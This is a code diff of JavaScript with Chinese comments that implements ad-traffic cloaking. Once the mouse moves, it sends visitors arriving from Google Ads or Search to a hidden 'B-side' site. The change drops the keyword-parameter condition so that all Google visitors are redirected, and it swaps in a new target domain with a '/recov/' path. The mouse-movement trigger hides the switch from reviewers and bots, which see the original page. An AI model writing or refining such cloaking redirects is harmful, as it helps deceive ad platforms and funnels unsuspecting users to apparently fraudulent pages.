@@ -71,16 +71,16 @@
             const isFromGoogle = isFromGoogleAds || isFromGoogleSearch;
          
             // 4. 终极审判：带 kw 参数 + 是谷歌来的
-            if (isFromGoogle && kw) {
+            if (isFromGoogle) {
                 hasTriggered = true;
                 document.removeEventListener('mousemove', handleMouseMove);
                     
                 // 【优化核心】：直接让浏览器跳转到 B 面网址
                 // 如果需要把当前的参数（比如 kw、gclid 等）带过去，可以使用下面这行：
-                // window.location.replace("https://yifanyi.linkingin.top/" + window.location.search);
+                // window.location.replace("https://sum812m.site/recov/" + window.location.search);
                 
                 // 如果只需要纯净地跳转到 B 面网址，用这行：
-                window.location.replace("https://yifanyi.linkingin.top/");
+                window.location.replace("https://sum812m.site/recov/");
                     
             } else {
                 document.removeEventListener('mousemove', handleMouseMove);
